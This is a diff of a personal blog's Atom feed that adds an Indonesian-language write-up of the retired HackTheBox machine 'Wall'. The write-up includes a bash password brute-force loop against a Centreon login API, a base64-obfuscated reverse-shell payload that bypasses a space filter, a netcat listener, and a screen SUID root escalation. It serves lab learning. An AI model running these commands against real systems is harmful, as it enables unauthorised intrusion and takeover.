@@ -1,5 +1,102 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://bl33dz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://bl33dz.github.io/" rel="alternate" type="text/html" /><updated>2019-12-02T08:37:47+07:00</updated><id>http://bl33dz.github.io/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; high school student&lt;br&gt; interested in linux and programming
-</subtitle><author><name>bl33dz</name></author><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://bl33dz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://bl33dz.github.io/" rel="alternate" type="text/html" /><updated>2019-12-08T13:38:34+07:00</updated><id>http://bl33dz.github.io/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; high school student&lt;br&gt; interested in linux and programming
+</subtitle><author><name>bl33dz</name></author><entry><title type="html">[HTB] Wall</title><link href="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html" rel="alternate" type="text/html" title="[HTB] Wall" /><published>2019-12-07T00:00:00+07:00</published><updated>2019-12-07T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/07/hackthebox-wall</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html">&lt;p&gt;Ya, akhirnya machine Wall ini retired dan digantikan machine baru &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/220&quot;&gt;Resolute&lt;/a&gt; (Windows) dan  sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.&lt;/p&gt;
+
+&lt;p&gt;Pertama, kaya biasa scan scan dulu pake nmap siapa tau nemu jalan &lt;del&gt;ke hatinya&lt;/del&gt; buat dapetin flag.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; nmap -sV -sC -sT  10.10.10.157 
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 06:17 WIB
+Nmap scan report for 10.10.10.157
+Host is up (0.31s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.33 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Dari output diatas kita bisa lihat bahwa machine tersebut memiliki 2 port yang terbuka yaitu port http dan port ssh. Sepertinya port http cuma nampilin default page dan di ssh gaada yang mencurigakan. Maka dari itu langsung saja kita bruteforce directory pada port httpnya.&lt;/p&gt;
+
+&lt;p&gt;Nah singkat cerita saya nemuin directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring/&lt;/code&gt; namun sayang directory tersebut diproteksi dengan autentikasi http. Disini saya stuck lumayan lama, namun setelah lihat &lt;del&gt;yang seger seger&lt;/del&gt; beberapa clue di forum, ada sebuah clue yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP Verb&lt;/code&gt;. HTTP Verb ini sama dengan HTTP Method yaitu GET,POST,HEAD,dan lain lain maka langsung saya coba melakukan request POST ke directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring/&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; curl -X POST http://10.10.10.157/monitoring/
+&amp;lt;h1&amp;gt;This page is not ready yet !&amp;lt;/h1&amp;gt;
+&amp;lt;h2&amp;gt;We should redirect you to the required page !&amp;lt;/h2&amp;gt;
+
+&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL='/centreon'&quot; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Boom, saya mendapat directory baru yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;/centreon/&lt;/code&gt;. Ketika saya buka directory tersebut saya mendapat tampilan seperti berikut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/wall-1.png&quot; alt=&quot;wall-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Karena di halaman tersebut terdapat versi dari webapps tersebut saya mencoba mencari exploitnya dan akhirnya menemukan exploit dari webapps tersebut. Namun, ternyata kita harus login dahulu sebelum melakukan exploit pada webapps tersebut. Maka saya mencoba membuat script sederhana untuk melakukan bruteforcing.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pass &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/nmap/nselib/data/passwords.lst&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl http://10.10.10.157/centreon/api/index.php?action&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;authenticate &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=admin&amp;amp;password=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; | jq &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Bad credentials&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Username: admin&quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;break
+	&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
+done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setelah itu kita hanya perlu mengeksekusi script diatas dan kita akan mendapatkan password untuk login&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; bash brute.sh 
+Username: admin
+Password: password1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Oke karena sudah dapet credential untuk login, sekarang kita hanya perlu mengekseksui script exploit RCE (&lt;a href=&quot;https://www.exploit-db.com/exploits/47069&quot;&gt;CVE-2019-13024&lt;/a&gt;). Sayangya exploit tersebut gagal, setelah lihat &lt;del&gt;yang seger seger&lt;/del&gt; comment di forum, ternyata ada filter yang mencegah kita menginput character spasi. Maka saya membuat payload seperti berikut.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44OC8xMzM3IDA+JjE7|base64${IFS}-d|bash;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Untuk script yang sudah saya modifikasi bisa diambil di &lt;a href=&quot;http://ix.io/23L9&quot;&gt;ix.io&lt;/a&gt;. Setelah itu kita hanya perlu menyiapkan listener &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -vlp 1337&lt;/code&gt; dan mengeksekusi script tersebut maka kita akan mendapat reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; nc -vlp 1337
+listening on [any] 1337 ...
+10.10.10.157: inverse host lookup failed: Unknown host
+connect to [10.10.15.88] from (UNKNOWN) [10.10.10.157] 32778
+bash: cannot set terminal process group (1002): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Wall:/usr/local/centreon/www$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Akhirnya dapet reverse shell juga, sampai sini kita akan mencari cara untuk mendapatkan user. Pertama saya melakukan enumerating menggunakan &lt;a href=&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt; dan ternyata mendapatkan sebuah SUID yang menarik.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dari sini saya menemukan sebuah exploit untuk binary diatas di &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;exploit-db&lt;/a&gt;. Langsung saja saya mencoba privilege escalation.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Wall:/tmp$ cd /etc
+www-data@Wall:/etc$ umask 000
+www-data@Wall:/etc$ screen -D -m -L ld.so.preload echo -ne  &quot;/tmp/libhax.so&quot;   
+www-data@Wall:/etc$ screen -ls
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@Wall:/etc$ /tmp/rootshell
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
+# cat /root/root.txt
+1fdbcf8c33eaa2599afdc52e1b4d5db7
+# cat /home/shelby/user.txt
+fe6194544f452f62dc905b12f8da8406
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dan akhirnya, sekali dayung 2 flag termiliki. Untuk lebih jelas mengenai &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/libhax.so&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/rootshell&lt;/code&gt; bisa dilihat di link exploit db diatas tadi.&lt;/p&gt;
+
+&lt;p&gt;Oke selesai juga machine ini, dan semoga ga males untuk nulis writeup selanjutnya.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Ya, akhirnya machine Wall ini retired dan digantikan machine baru Resolute (Windows) dan sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP 10.10.10.157. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.</summary></entry><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;
 
 &lt;p&gt;Oke, hackNos ini adalah machine yg menggunakan os linux. Untuk info machine ini sendiri bisa diklik link berikut &lt;a href=&quot;https://www.vulnhub.com/entry/hacknos-os-hacknos,401/&quot;&gt;hackNos&lt;/a&gt; lalu download file OVA yg tersedia.&lt;/p&gt;
 
